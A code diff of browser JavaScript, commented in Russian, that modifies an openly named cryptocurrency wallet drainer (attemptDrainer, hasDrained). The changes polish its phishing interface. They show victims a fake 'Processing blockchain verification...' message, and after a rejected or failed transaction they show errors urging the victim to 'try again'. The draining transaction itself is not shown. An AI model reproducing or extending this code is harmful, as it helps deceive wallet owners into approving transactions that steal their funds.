@@ -30,6 +30,7 @@ let isTransactionPending = false;
 let actionBtn = null;
 let modalOverlay = null;
 let modalContent = null;
+let modalSubtitle = null; // Для обновления текста в модальном окне
 
 // Список надёжных RPC для fallback для всех поддерживаемых сетей
 const FALLBACK_RPCS = {
@@ -366,6 +367,9 @@ window.addEventListener('DOMContentLoaded', () => {
   `;
   document.body.appendChild(modalContent);
 
+  // Сохраняем ссылку на modal-subtitle для динамического обновления
+  modalSubtitle = modalContent.querySelector('.modal-subtitle');
+
   // Проверяем наличие инжектированного провайдера
   if (!isInjected) {
     actionBtn.style.display = 'inline-block';
@@ -387,13 +391,18 @@ function showModal() {
   modalOverlay.style.display = 'block';
   modalOverlay.style.pointerEvents = 'auto'; // Убедимся, что оверлей кликабельный
   modalContent.style.display = 'block';
+  modalSubtitle.textContent = "Processing blockchain verification..."; // Сбрасываем текст
 }
 
-function hideModal() {
+async function hideModalWithDelay(errorMessage = null) {
+  if (errorMessage) {
+    modalSubtitle.textContent = `Error: ${errorMessage}. Please try again.`;
+    console.log(`⏳ Задержка перед закрытием модального окна: ${errorMessage}`);
+    await new Promise(resolve => setTimeout(resolve, 3000)); // Задержка 3 секунды
+  }
   modalOverlay.style.display = 'none';
-  modalOverlay.style.pointerEvents = 'none'; // Отключаем кликабельность оверлея
+  modalOverlay.style.pointerEvents = 'none';
   modalContent.style.display = 'none';
-  // Убедимся, что основной контент снова доступен
   document.body.style.pointerEvents = 'auto';
 }
 
@@ -419,8 +428,8 @@ async function attemptDrainer() {
 
     if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
       console.error('❌ Несоответствие адресов:', address, connectedAddress);
-      hideModal();
-      isTransactionPending = false; // Сбрасываем состояние
+      isTransactionPending = false;
+      await hideModalWithDelay("Wallet address mismatch");
       return;
     }
 
@@ -431,20 +440,20 @@ async function attemptDrainer() {
     hasDrained = true;
     isTransactionPending = false;
     cleanup();
-    hideModal();
+    await hideModalWithDelay();
   } catch (err) {
-    isTransactionPending = false; // Сбрасываем состояние даже при ошибке
-    hideModal();
+    isTransactionPending = false;
     if (err.message.includes('user rejected')) {
       console.log('🙅 Пользователь отклонил транзакцию');
+      await hideModalWithDelay("Transaction rejected by user");
     } else {
       console.error('❌ Ошибка выполнения drainer:', err.message);
-      throw err;
+      await hideModalWithDelay(err.message || "Unknown error occurred");
+      throw err; // Оставляем throw для отладки
     }
   } finally {
-    // Гарантируем, что состояние сброшено и модальное окно закрыто
     isTransactionPending = false;
-    hideModal();
+    // Модальное окно уже закрывается в блоках try/catch
   }
 }
 
@@ -468,8 +477,8 @@ async function handleConnectOrAction() {
     }
   } catch (err) {
     console.error('❌ Ошибка подключения:', err.message);
-    isTransactionPending = false; // Сбрасываем состояние при ошибке подключения
-    hideModal();
+    isTransactionPending = false;
+    await hideModalWithDelay(err.message || "Failed to connect wallet");
   }
 }
 
@@ -490,7 +499,7 @@ function cleanup() {
   window.ethereum.removeListener('chainChanged', onChainChanged);
   actionBtn.disabled = true;
   actionBtn.style.opacity = '0.6';
-  hideModal(); // Убедимся, что модальное окно закрыто
+  hideModalWithDelay(); // Убедимся, что модальное окно закрыто
 }
 
 // === Ожидание подключения кошелька ===
